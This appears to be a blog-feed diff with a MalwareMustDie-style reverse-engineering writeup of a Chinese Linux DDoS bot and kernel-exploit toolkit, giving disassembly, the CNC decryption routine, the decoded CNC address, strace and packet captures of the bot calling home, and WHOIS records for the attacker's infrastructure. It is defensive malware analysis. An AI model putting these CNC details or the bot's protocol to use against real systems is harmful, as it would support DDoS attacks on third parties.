+pwnkernel:                   d6f00b090c4ea1052fc1f4abdd47e72e  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+root.py:                     8a03114a2f269f6413767130bde53403  Python script, ASCII text executable
+run.sh:                      8484ddd6282dc0b90d4e903866dc1526  Bourne-Again shell script, ASCII text executable
+runx:                        3ae636b32c25cfe12dd0a17a26162722  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+tivoli:                      c02abcfd984f50ed3588e8703f667f6a  ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+ubuntu:                      dcdb22eef329ee15bb075ed24dfa9902  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+url:                         8c317f4c9fa83d21e4a6aec63ae61ccf  ASCII text, with CRLF line terminators
+vmsplice-local-root-exploit: a83d56cd9f61f6cf20272681d7ff3b91  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+z1d-2011:                    aa5abe2823e405ffce8b55e9145fd251  ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), stripped
+茘鐔域鐔肴㏍誌住鐔区鐔庚zip: d8ece01117f50ada46eeef399fcb7444  Zip archive data, at least v2.0 to extract
+
+---
+#MalwareMustDie | IR Handle: MMDD-2014-0026
+</pre>
+
+
+<p>Full copy here: <a href="http://pastebin.com/3psXaj0C">http://pastebin.com/3psXaj0C</a></p>
+
+<p>And Here&rsquo;s MMD&rsquo;s Binary analysis on one of the ELF binaries that isn&rsquo;t a Kernel Exploit. Is a standard DDoS Binary that appears to dial home to a CNC:</p>
+
+<pre>
+# MalwareMustDie China ELF DDoSer Analysis
+# Comments edited by Yinette
+# Sample: 9a2a00f4bba2f3e0b1211a1f0cb48896
+# ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.2.5, not stripped
+# VT: https://www.virustotal.com/en/file/bb4786695774ae7777200a78e56db83ad5d5bdf1c1b84ef86dd796f7c9a3e1b4/analysis/1409687242/
+
+# Reference1 analysis (x64 base compilation, older version, new dates, CNC: 199.101.117.142)
+https://www.virustotal.com/en/file/8fa44a7b3eb707f584b223792bdb78b1e5f69a40dba20634094077c2f0287bca/analysis/1409730903/ 
+# Reference2 analysis (same compilation, same CNC IP 61.147.103.21 w/u different port number as CNC)
+https://www.virustotal.com/en/file/d2b3ce2195b1422c165faeb1fbbdd098f13df6cf6595fb18f8d618cd78df597c/analysis/1409729124/
+
+# =============================
+# Binary Analysis
+# =============================
+
+ELF Header:
+  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
+  Class:                             ELF32
+  Data:                              2s complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Intel 80386
+  Version:                           0x1
+  Entry point address:               0x8048120
+  Start of program headers:          52 (bytes into file)
+  Start of section headers:          1199680 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               52 (bytes)
+  Size of program headers:           32 (bytes)
+  Number of program headers:         5
+  Size of section headers:           40 (bytes)
+  Number of section headers:         28
+  Section header string table index: 25
+
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
+  [ 1] .note.ABI-tag     NOTE            080480d4 0000d4 000020 00   A  0   0  4
+  [ 2] .init             PROGBITS        080480f4 0000f4 000017 00  AX  0   0  4
+  [ 3] .text             PROGBITS        08048120 000120 0e3800 00  AX  0   0 32
+  [ 4] __libc_freeres_fn PROGBITS        0812b920 0e3920 000f6e 00  AX  0   0  4
+  [ 5] __libc_thread_fre PROGBITS        0812c890 0e4890 0000e2 00  AX  0   0  4
+  [ 6] .fini             PROGBITS        0812c974 0e4974 00001a 00  AX  0   0  4
+  [ 7] .rodata           PROGBITS        0812c9a0 0e49a0 021eee 00   A  0   0 32
+  [ 8] __libc_subfreeres PROGBITS        0814e890 106890 00003c 00   A  0   0  4
+  [ 9] __libc_atexit     PROGBITS        0814e8cc 1068cc 000004 00   A  0   0  4
+  [10] __libc_thread_sub PROGBITS        0814e8d0 1068d0 000004 00   A  0   0  4
+  [11] .eh_frame         PROGBITS        0814e8d4 1068d4 016d08 00   A  0   0  4
+  [12] .gcc_except_table PROGBITS        081655dc 11d5dc 005049 00   A  0   0  4
+  [13] .tdata            PROGBITS        0816b628 122628 000014 00 WAT  0   0  4
+  [14] .tbss             NOBITS          0816b63c 12263c 00001c 00 WAT  0   0  4
+  [15] .ctors            PROGBITS        0816b63c 12263c 00002c 00  WA  0   0  4
+  [16] .dtors            PROGBITS        0816b668 122668 00000c 00  WA  0   0  4
+  [17] .jcr              PROGBITS        0816b674 122674 000004 00  WA  0   0  4
+  [18] .data.rel.ro      PROGBITS        0816b680 122680 00063c 00  WA  0   0 32
+  [19] .got              PROGBITS        0816bcbc 122cbc 00005c 04  WA  0   0  4
+  [20] .got.plt          PROGBITS        0816bd18 122d18 00000c 04  WA  0   0  4
+  [21] .data             PROGBITS        0816bd40 122d40 001034 00  WA  0   0 32
+  [22] .bss              NOBITS          0816cd80 123d74 0091d8 00  WA  0   0 32
+  [23] __libc_freeres_pt NOBITS          08175f58 123d74 000020 00  WA  0   0  4
+  [24] .comment          PROGBITS        00000000 123d74 000fa5 00      0   0  1
+  [25] .shstrtab         STRTAB          00000000 124d19 000126 00      0   0  1
+  [26] .symtab           SYMTAB          00000000 1252a0 018110 10     27 1246  4
+  [27] .strtab           STRTAB          00000000 13d3b0 03224e 00      0   0  1
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  LOAD           0x000000 0x08048000 0x08048000 0x122625 0x122625 R E 0x1000
+  LOAD           0x122628 0x0816b628 0x0816b628 0x0174c 0x0a950 RW  0x1000
+  NOTE           0x0000d4 0x080480d4 0x080480d4 0x00020 0x00020 R   0x4
+  TLS            0x122628 0x0816b628 0x0816b628 0x00014 0x00030 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+
+ Section to Segment mapping:
+  Segment Sections...
+   00     .note.ABI-tag .init .text __libc_freeres_fn __libc_thread_freeres_fn .fini .rodata __libc_subfreeres __libc_atexit __libc_thread_subfreeres .eh_frame .gcc_except_table
+   01     .tdata .ctors .dtors .jcr .data.rel.ro .got .got.plt .data .bss __libc_freeres_ptrs
+   02     .note.ABI-tag
+   03     .tdata .tbss
+
+Offset 0x000000d4 | len x00000020:
+  Owner         Data size       Description
+  GNU           0x00000010      NT_VERSION (version)
+
+// Notes:
+no dynamic section 
+no relocations 
+no unwind sections 
+
+# =============================
+# Reversing w/debug PoC
+# =============================
+
+// first section reversed (for characteristics)
+            ;-- section..text:
+            0x08048120    31ed         xor ebp, ebp
+            0x08048122    5e           pop esi
+            0x08048123    89e1         mov ecx, esp
+            0x08048125    83e4f0       and esp, 0xfffffff0
+            0x08048128    50           push eax
+            0x08048129    54           push esp
+            0x0804812a    52           push edx
+            0x0804812b    68f4c20c08   push sym.__libc_csu_fini ; 0x080cc2f4
+            0x08048130    689cc20c08   push sym.__libc_csu_init ; 0x080cc29c
+            0x08048135    51           push ecx
+            0x08048136    56           push esi
+            0x08048137    681ca70408   push sym.main ; 0x0804a71c
+            0x0804813c    e8cf390800   call sym.__libc_start_main
+               0x080cbb10(unk, unk, unk, unk, unk, unk, unk, unk) ; sym.__libc_start_main
+            0x08048141    f4           hlt
+            0x08048142    90           nop
+            0x08048143    90           nop
+
+// Chinese does appear quite often through the binary, this ties in with the chinese source that these were obtained from.
+// Not sure where this katakana on the first line came from though... - Yinette
+
+.rodata:081301A0 aINZD  db 'ｴｴｽｨﾔｭﾊｼﾌﾗｽﾓﾗﾖﾊｧｰﾜ(%d)',0Dh,0Ah,0
+0x00747E0  CUNG5
+0x007518F  CUNG 
+0x0075693  B4CUNG
+0x0102520  i18n:1999
+  :
+
+// config:
+0x00E5C22  fake.cfg
+// template:
+%d
+%d.%d.%d.%d:%d.%d.%d.%d
+%d:%d
+
+// poc:
+# cat fake.cfg
+0
+YOUR-IP-HERE:AND-HERE
+10000:60000
+
+// Obtain IP of interface with the default route and write it to fake.cfg:
+
+getsockname(3, {sa_family=AF_INET, sin_port=htons(48417), sin_addr=inet_addr("mmd.mmd.mmd.mmd")}, [16]) = 0
+
+
+//Does a DNS Query for www.baidu.com against google's open resolvers at 8.8.8.8 (To test for internet reachability)
+
+0x00E50FD  www.baidu.com
+// PoC:
+sendto(3, "\231\v\1\0\0\1\0\0\0\0\0\0\3www\5baidu\3com\0\0\1\0\1", 31, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 31
+recvfrom(3, "\231\v\201\200\0\1\0\2\0\0\0\0\3www\5baidu\3com\0\0\1\0\1\300"..., 1024, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, [16]) = 74
+
+// compile/compat traces:
+
+0x0124CC0  GCC: (GNU) 4.0.0 20050519 (Red Hat 4.0.0-8)
+0x0124CED  GCC: (GNU) 4.0.0 20050525 (Red Hat 4.0.0-9)
+
+// Sources:
+
+ 'crtstuff.c'
+ 'Fake.cpp'
+ 'Global.cpp'
+ 'main.cpp'
+ 'Manager.cpp'
+ 'ProtocolUtil.cpp'
+ 'ServerIP.cpp'
+ 'StatBase.cpp'
+ 'ThreadAttack.cpp'
+ 'ThreadAttackKernal.cpp'
+ 'ThreadHostStatus.cpp'
+ 'ThreadTaskManager.cpp'
+ 'ThreadTimer.cpp'
+ 'AutoLock.cpp'
+ 'FileOp.cpp'
+ 'Log.cpp'
+ 'Md5.cpp'
+ 'Media.cpp'
+ 'NetBase.cpp'
+ 'ThreadCondition.cpp'
+ 'Thread.cpp'
+ 'ThreadMutex.cpp'
+ 'Utility.cpp'
+
+// The ThreadAttack.cpp file in particular provides key functions for some
+// nasty looking attacks:
+
+CThreadAttack::ProcessMain(void)
+CThreadAttack::EmptyConnectionAtk(CSubTask &)
+CThreadAttack::HttpAtk(CSubTask &) 
+CThreadAttack::FakeUserAtk(CSubTask &)
+CThreadAttack::Stop(void)  
+CThreadAttack::DomainInitEx(CRandArray &,char  const*)  
+CThreadAttack::DomainRandEx(CRandArray &,int &) 
+CThreadAttack::CrossPkt(int) 
+CThreadAttack::~CThreadAttack() 
+CThreadAttack::CThreadAttack(CManager *)
+CThreadAttack::Start(CCmdMessage *)
+CThreadAttack::InitCrossPkts(std::vector<uint,std::allocator<uint>..
+CThreadAttack::PktAtk(CSubTask &,std::vector<uint,std::allocator<..
+
+// Key Attacks Noted besides DDoS functions:
+
+  0x805478A ; CThreadAttack::EmptyConnectionAtk(CSubTask &)
+  0x805478Apublic _ZN13CThreadAttack18EmptyConnectionAtkER8CSubTask
+  0x805478A_ZN13CThreadAttack18EmptyConnectionAtkER8CSubTask proc near
+  0x805478A push ebp
+  0x805478B mov  ebp, esp
+  0x805478D leave
+  0x805478E retn 
+  0x805478E
+  0x805478E _ZN13CThreadAttack18EmptyConnectionAtkER8CSubTask endp
+
+  0x8054790 ; CThreadAttack::HttpAtk(CSubTask &)
+  0x8054790public _ZN13CThreadAttack7HttpAtkER8CSubTask
+  0x8054790_ZN13CThreadAttack7HttpAtkER8CSubTask proc near
+  0x8054790 push ebp
+  0x8054791 mov  ebp, esp
+  0x8054793 leave
+  0x8054794 retn 
+  0x8054794
+  0x8054794 _ZN13CThreadAttack7HttpAtkER8CSubTask endp
+
+  0x8054796 ; CThreadAttack::FakeUserAtk(CSubTask &)
+  0x8054796public _ZN13CThreadAttack11FakeUserAtkER8CSubTask
+  0x8054796_ZN13CThreadAttack11FakeUserAtkER8CSubTask proc near
+  0x8054796 push ebp
+  0x8054797 mov  ebp, esp
+  0x8054799 leave
+  0x805479A retn 
+  0x805479A
+  0x805479A _ZN13CThreadAttack11FakeUserAtkER8CSubTask endp
+
+// Spawn processes and and phone home to CNC (note 44 processes will be spawned for phoning home):
+     :
+  0x80532D2 sub  esp, 214h ; Integer Subtraction
+  0x80532D8 lea  ecx, [ebp+var_10C] ; Load Effective Address
+  0x80532DE mov  edx, offset _ZZN9CServerIP10InitializeEvE4C_48 ; CServerIP::Initialize(void)::C.48 <======
+  0x80532E3 mov  eax, 100h
+  0x80532E8 sub  esp, 4  ; Integer Subtraction
+  0x80532EB push eax
+  0x80532EC push edx
+  0x80532ED push ecx
+  0x80532EE call memcpy  ; Call Procedure
+  0x80532F3 add  esp, 10h; Add
+  0x80532F6 lea  ecx, [ebp+var_20C] ; Load Effective Address
+  0x80532FC mov  edx, offset _ZZN9CServerIP10InitializeEvE4C_49 ; CServerIP::Initialize(void)::C.49 <======
+  0x8053301 mov  eax, 100h
+  0x8053306 sub  esp, 4  ; Integer Subtraction
+  0x8053309 push eax
+  0x805330A push edx
+  0x805330B push ecx
+  0x805330C call memcpy  ; Call Procedure
+  0x8053311 add  esp, 10h; Add
+  0x8053314 push 27h
+  0x8053316 push offset a7005601212 ; "70/056/012/12"  ; <============================
+  0x805331B push 0FFh
+  0x8053320 lea  eax, [ebp+var_10C] ; Load Effective Address
+  0x8053326 push eax
+  0x8053327 call _ZN8CUtility7DeCryptEPciPKci ; CUtility::DeCrypt(char *,int,char  const*,int)
+  0x805332C add  esp, 10h; Add
+  0x805332F push 0Ah
+  0x8053331 push offset a63551; "63551" ; <============================
+  0x8053336 push 0FFh
+  0x805333B lea  eax, [ebp+var_20C] ; Load Effective Address
+  0x8053341 push eax
+  0x8053342 call _ZN8CUtility7DeCryptEPciPKci ; CUtility::DeCrypt(char *,int,char  const
+
+
+// Decrypting their garbage to reveal CNC's IP Address:
+
+  0x8062EF0
+  0x8062EF0 ; CUtility::DeCrypt(char *, int, char  const*, int)
+  0x8062EF0 public _ZN8CUtility7DeCryptEPciPKci
+  0x8062EF0 _ZN8CUtility7DeCryptEPciPKci proc near  ; CODE XREF: CServerIP::Initialize(void)
+  0x8062EF0 ; CServerIP::Initialize(void)
+  0x8062EF0
+  0x8062EF0 var_4= dword ptr -4
+  0x8062EF0 arg_0= dword ptr  8
+  0x8062EF0 arg_4= dword ptr  0Ch
+  0x8062EF0 arg_8= dword ptr  10h
+  0x8062EF0 arg_C= dword ptr  14h
+  0x8062EF0
+  0x8062EF0 push ebp
+  0x8062EF1 mov  ebp, esp
+  0x8062EF3 sub  esp, 10h; Integer Subtraction
+  0x8062EF6 mov  [ebp+var_4], 0
+  0x8062EFD jmp  short loc_8062F36 ; Jump
+  0x8062EFD
+  0x8062EFF
+  0x8062EFF loc_8062EFF: ; CODE XREF: CUtility::DeCrypt(char *,int,char  const*,int)
+  0x8062EFF mov  eax, [ebp+var_4]
+  0x8062F02 and  eax, 1  ; Logical AND
+  0x8062F05 test al, al  ; Logical Compare
+  0x8062F07 jzshort loc_8062F1E ; Jump if Zero (ZF=1)
+  0x8062F07
+  0x8062F09 mov  eax, [ebp+var_4]
+  0x8062F0C mov  edx, eax
+  0x8062F0E add  edx, [ebp+arg_0] ; Add
+  0x8062F11 mov  eax, [ebp+var_4]
+  0x8062F14 add  eax, [ebp+arg_8] ; Add
+  0x8062F17 mov  al, [eax]
+  0x8062F19 inc  eax  ; Increment by 1
+  0x8062F1A mov  [edx], al
+  0x8062F1C jmp  short loc_8062F31 ; Jump
+  0x8062F1C
+  0x8062F1E
+  0x8062F1E loc_8062F1E: ; CODE XREF: CUtility::DeCrypt(char *,int,char  const*,int)
+  0x8062F1E mov  eax, [ebp+var_4]
+  0x8062F21 mov  edx, eax
+  0x8062F23 add  edx, [ebp+arg_0] ; Add
+  0x8062F26 mov  eax, [ebp+var_4]
+  0x8062F29 add  eax, [ebp+arg_8] ; Add
+  0x8062F2C mov  al, [eax]
+  0x8062F2E dec  eax  ; Decrement by 1
+  0x8062F2F mov  [edx], al
+  0x8062F2F
+  0x8062F31
+  0x8062F31 loc_8062F31: ; CODE XREF: CUtility::DeCrypt(char *,int,char  const*,int)
+  0x8062F31 lea  eax, [ebp+var_4] ; Load Effective Address
+  0x8062F34 inc  dword ptr [eax] ; Increment by 1
+  0x8062F34
+  0x8062F36
+  0x8062F36 loc_8062F36: ; CODE XREF: CUtility::DeCrypt(char *,int,char  const*,int)
+  0x8062F36 mov  eax, [ebp+var_4]
+  0x8062F39 cmp  eax, [ebp+arg_C] ; Compare Two Operands
+  0x8062F3C jge  short locret_8062F52 ; Jump if Greater or Equal (SF=OF)
+  0x8062F3C
+  0x8062F3E mov  eax, [ebp+var_4]
+  0x8062F41 cmp  eax, [ebp+arg_4] ; Compare Two Operands
+  0x8062F44 jge  short locret_8062F52 ; Jump if Greater or Equal (SF=OF)
+  0x8062F44
+  0x8062F46 mov  eax, [ebp+var_4]
+  0x8062F49 add  eax, [ebp+arg_8] ; Add
+  0x8062F4C mov  al, [eax]
+  0x8062F4E test al, al  ; Logical Compare
+  0x8062F50 jnz  short loc_8062EFF ; Jump if Not Zero (ZF=0)
+  0x8062F50
+  0x8062F52
+  0x8062F52 locret_8062F52: ; CODE XREF: CUtility::DeCrypt(char *,int,char  const*,int)
+  0x8062F52 ; CUtility::DeCrypt(char *,int,char  const*,int)
+  0x8062F52 leave; High Level Procedure Exit
+  0x8062F53 retn ; Return Near from Procedure
+  0x8062F53
+  0x8062F53 _ZN8CUtility7DeCryptEPciPKci endp
+  0x8062F53
+
+// CNC Decoded as the following: 
+
+61.147.103.21:54460
+
+// PoC-ed (o hai!):
+
+connect(3, {sa_family=AF_INET, sin_port=htons(54460), sin_addr=inet_addr("61.147.103.21")}, 16) = -1 EINPROGRESS (flag)
+send(3, "\270\v\0\0\0N.%EN.%E\20'`\352MMD-IS-BANGING-YOU-B1TCH! x.x.x.x"..., 401, 0) = 401
+
+// Spawning process PoC (44 rounds w/ one parent as per reversed)
+Process 17553 detached
+Process 17552 detached
+  :
+Process 17593 detached
+Process 17594 detached
+
+// CNC communication:
+// Two steps communication:
+
+// 1. Establish a TCP Socket and HTTP session to 180.76.3.151
+
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+setsockopt(3, SOL_SOCKET, SO_LINGER, {onoff=1, linger=0}, 8) = 0
+fcntl64(3, F_GETFL)                     = 0x2 (flags O_RDWR)
+fcntl64(3, F_SETFL, O_RDWR|O_NONBLOCK)  = 0
+connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("180.76.3.151")}, 16) = -1 EINPROGRESS
+
+x.x.x.x 180.76.3.151    TCP 74  48417 > http [SYN] Seq=0 Win=14600 Len=0 MSS=1460 SACK_PERM=1 TSval=895351513 TSecr=0 WS=128
+180.76.3.151    x.x.x.x TCP 74  http > 48417 [SYN, ACK] Seq=0 Ack=1 Win=14600 Len=0 MSS=1440 SACK_PERM=1
+x.x.x.x 180.76.3.151    TCP 54  48417 > http [RST] Seq=1 Win=0 Len=0
+
+// 2. Send data back to CnC:
+
+x.x.x.x 61.147.103.21   TCP 455 33911 > 54460 [PSH, ACK] Seq=1 Ack=1 Win=14720 Len=401
+
+00000000  b8 0b 00 00 00 4e 2e 25  45 4e 2e 25 45 10 27 60 .....N.% EN.%E.**
+00000010  ea 4c 69 6e 75 78 20 33  2e 32 2e 30 2d 34 2d 61 .Linux 3 .2.0-4-a
+00000020  6d 64 36 34 00 00 00 00  00 00 00 00 00 00 00 00 md64.... ........
+00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+000000A0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+000000B0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+000000C0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+000000D0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+000000E0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+000000F0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000100  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000120  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000130  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000140  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000160  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000170  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000180  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
+00000190  00                                               .
+
+----
+#MalwareMustDie!
+/* This analysis post is dedicated to all UNIX sysadmins */
+</pre>
+
+
+<p>Full copy here: <a href="http://pastebin.com/949Y8a3g">http://pastebin.com/949Y8a3g</a></p>
+
+<h2>Domain and IP analysis</h2>
+
+<p>Interestingly (or not), the attack in this instance came from the same IP that we saw hosting the files and the same IP that is the CNC.
+The system itself appears to be a machine hosted out of Jiangsu Provence, China.</p>
+
+<p>Here&rsquo;s what we could see on the web-based file explorer:</p>
+
+<p><img src="https://lh6.googleusercontent.com/-9rJWeo2uEOE/VAWh2D3QnUI/AAAAAAAAQxc/tLOTAb-Pg3g/s2176/000.png" alt="" />
+(photo supplied by MalwareMustDie)</p>
+
+<h3>After I had retrieved MOST of the files, it appears they noticed and then deleted everything (hey guys! lol)</h3>
+
+<p>There is a domain pointing to our CNC,Hosting,Attack IP (as evident in our massive shell script) <code>pingyan-china.com</code></p>
+
+<pre>
+The Registry database contains ONLY .COM, .NET, .EDU domains and
+Registrars.
+Domain Name:pingyan-china.com
+Registry Domain ID:
+Registrar WHOIS Server:whois.paycenter.com.cn
+Registrar URL:http://www.xinnet.com
+Updated Date:2013-09-30 00:38:42
+Creation Date:2013-09-30 00:33:31
+Registrar Registration Expiration Date:2014-09-30 00:33:31
+Registrar:XINNET TECHNOLOGY CORPORATION
+Registrar IANA ID:120
+Registrar Abuse Contact Email:supervision@xinnet.com
+Registrar Abuse Contact Phone:+86.1087128064
+Domain Status:ok
+Registry Registrant ID:
+Registrant Name:Wang ShanShi
+Registrant Organization:fdgf fggh
+Registrant Street:gghjkj  ddfgh dddf
+Registrant City:chengdu
+Registrant State/Province:Sichuan
+Registrant Postal Code:310400
+Registrant Country:China
+Registrant Phone:+86.028 89908908
+Registrant Phone Ext:
+Registrant Fax:+86.028 78789090
+Registrant Fax Ext:
+Registrant Email:280954460@qq.com
+Registry Admin ID:
+Admin Name:fdgf fggh
+Admin Organization:fdgf fggh
+Admin Street:gghjkj  ddfgh dddf
+Admin City:chengdu
+Admin State/Province:Sichuan
+Admin PostalCode:310400
+Admin Country:China
+Admin Phone:+86.028 89908908
+Admin Phone Ext:
+Admin Fax:+86.028 78789090
+Admin Fax Ext:
+Admin Email:280954460@qq.com
+Registry Tech ID:
+Tech Name:fdgf fggh
+Tech Organization:fdgf fggh
+Tech Street:gghjkj  ddfgh dddf
+Tech City:chengdu
+Tech State/Province:Sichuan
+Tech PostalCode:310400
+Tech Country:China
+Tech Phone:+86.028 89908908
+Tech Phone Ext:
+Tech Fax:+86.028 78789090
+Tech Fax Ext:
+Tech Email:280954460@qq.com
+Name Server:dxdns.ybnic.com
+Name Server:dxdns2.ybnic.com
+Name Server:ltdns.ybnic.com
+Name Server:gwdns.ybnic.com
+DNSSEC:unsigned
+</pre>
+
+
+<p><img src="http://www.quickmeme.com/img/d5/d532df75d0e07e98301fd109db044a5005ecc404a25171ad3be05d0a8361f00b.jpg" title="DEEAAD GIVEAWAY" alt="" /></p>
+
+<p>As you can see in the whois, this is likely to not be a legitimate registration, unless Wang Shanshi works at a company called <em>&lsquo;fdgf fggh&rsquo;</em> at the address of <em>&lsquo;gghjkj  ddfgh dddf, Sichuan, CN.&rsquo;</em></p>
+
+<p>(Or Mr Shanshi is a lazy bastard at typing.)</p>
+
+<p>Google couldn&rsquo;t help me with that one&hellip;</p>
+
+<p>The IP <code>61.147.103.21</code> itself is familiar to me:</p>
+
+<pre>
+inetnum:        61.147.0.0 - 61.147.255.255
+netname:        CHINANET-JS
+descr:          CHINANET jiangsu province network
+descr:          China Telecom
+descr:          A12,Xin-Jie-Kou-Wai Street
+descr:          Beijing 100088
+country:        CN
+admin-c:        CH93-AP
+tech-c:         CJ186-AP
+mnt-by:         MAINT-CHINANET
+mnt-lower:      MAINT-CHINANET-JS
+mnt-routes:     maint-chinanet-js
+changed:        hostmaster@ns.chinanet.cn.net 20020209
+changed:        hostmaster@ns.chinanet.cn.net 20030306
+status:         ALLOCATED non-PORTABLE
+source:         APNIC
+
+role:           CHINANET JIANGSU
+address:        260 Zhongyang Road,Nanjing 210037
+country:        CN
+phone:          +86-25-86588231
+phone:          +86-25-86588745
+fax-no:         +86-25-86588104
+e-mail:         ip@jsinfo.net
+remarks:        send anti-spam reports to spam@jsinfo.net
+remarks:        send abuse reports to abuse@jsinfo.net
+remarks:        times in GMT+8
+admin-c:        CH360-AP
+tech-c:         CS306-AP
+tech-c:         CN142-AP
+nic-hdl:        CJ186-AP
+remarks:        www.jsinfo.net
+notify:         ip@jsinfo.net
+mnt-by:         MAINT-CHINANET-JS
+changed:        dns@jsinfo.net 20090831
+changed:        ip@jsinfo.net 20090831
+changed:        hm-changed@apnic.net 20090901
+source:         APNIC
+changed:        hm-changed@apnic.net 20111114
+
+person:         Chinanet Hostmaster
+nic-hdl:        CH93-AP
+e-mail:         anti-spam@ns.chinanet.cn.net
+address:        No.31 ,jingrong street,beijing
+address:        100032
+phone:          +86-10-58501724
+fax-no:         +86-10-58501724
+country:        CN
+changed:        dingsy@cndata.com 20070416
+changed:        zhengzm@gsta.com 20140227
+mnt-by:         MAINT-CHINANET
+source:         APNIC
+</pre>
+
+
+<p>This doesn&rsquo;t surprise me, ranges in the 61.147.0.0/16 are known for malicious traffic. In particular I&rsquo;ve spotted the entire <code>61.147.51.0/24</code> range SSH Brute-Forcing a lot of IPs at once.
+Someone has some serious resources going into this shit.</p>
+
+<h3>Quick Update!</h3>
+
+<p>Seems after deleting everything off their webserver, they decided to upload something new.</p>
+
+<p>Check out the following VirusTotal Result and MMD&rsquo;s comments with some quick RE notes :)</p>
+
+<p><a href="https://www.virustotal.com/en/file/6dd946e821df59705dcfeb79fab810336d0ee497fd715fb5b6711e05c0428f4d/analysis/">https://www.virustotal.com/en/file/6dd946e821df59705dcfeb79fab810336d0ee497fd715fb5b6711e05c0428f4d/analysis/</a></p>
+
+<p>More to come!</p>
+
+<h2>Thanks to:</h2>
+
+<p> MalwareMustDie for ELF Analysis and Research.</p>
+
+<p> These random chinese guys for leaving their toys for me to find :)</p>
+
+<p> My work for allowing me to do cool shit like this for a hobby.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[I59]]></title>
